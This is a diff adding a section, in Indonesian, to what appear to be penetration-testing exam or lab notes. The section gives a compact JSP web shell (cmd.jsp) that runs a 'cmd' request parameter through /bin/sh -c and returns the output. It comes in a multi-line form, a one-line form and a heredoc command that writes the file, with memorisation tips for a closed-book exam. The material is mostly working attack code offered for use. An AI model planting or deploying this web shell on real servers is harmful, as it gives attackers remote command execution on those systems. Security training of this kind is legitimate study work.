@@ -517,6 +517,73 @@ Contoh request:
 
 ---
 
+#### Alternatif `cmd.jsp` Versi Singkat
+
+Untuk ujian closed book, JSP dapat disederhanakan menjadi versi berikut:
+
+```jsp
+<%@ page import="java.io.*" %>
+<%
+String c=request.getParameter("cmd");
+if(c!=null){
+    Process p=Runtime.getRuntime().exec(
+        new String[]{"/bin/sh","-c",c+" 2>&1"}
+    );
+    p.getInputStream().transferTo(response.getOutputStream());
+}
+%>
+```
+
+Versi satu baris:
+
+```jsp
+<%@ page import="java.io.*" %><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c+" 2>&1"});p.getInputStream().transferTo(response.getOutputStream());}%>
+```
+
+File dapat dibuat langsung dari terminal:
+
+```bash
+cat > cmd.jsp <<'EOF'
+<%@ page import="java.io.*" %><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c+" 2>&1"});p.getInputStream().transferTo(response.getOutputStream());}%>
+EOF
+```
+
+### Cara Mengingat Versi Singkat
+
+```text
+Ambil cmd → jalankan sh -c → kirim output ke response
+```
+
+Tiga bagian utamanya:
+
+```jsp
+request.getParameter("cmd")
+```
+
+```jsp
+Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c+" 2>&1"})
+```
+
+```jsp
+p.getInputStream().transferTo(response.getOutputStream())
+```
+
+Keterangan:
+
+- `"/bin/sh", "-c", c` memungkinkan command menggunakan spasi, pipe, redirect, `;`, dan `&&`.
+- `2>&1` menggabungkan error output ke standard output agar pesan kesalahan ikut terlihat.
+- `transferTo()` tersedia mulai Java 9. Target lab menggunakan Java 17, sehingga metode ini dapat digunakan.
+- Versi singkat cocok untuk ujian dan laboratorium.
+- Versi lengkap sebelumnya lebih baik untuk pembelajaran, troubleshooting, dan dokumentasi karena alur pemrosesan output lebih jelas.
+
+Rumus hafalan:
+
+```text
+JSP → JAR → DEPLOY → CURL
+```
+
+---
+
 ### 5.3 Membuat File WAR
 
 Menggunakan `jar`:
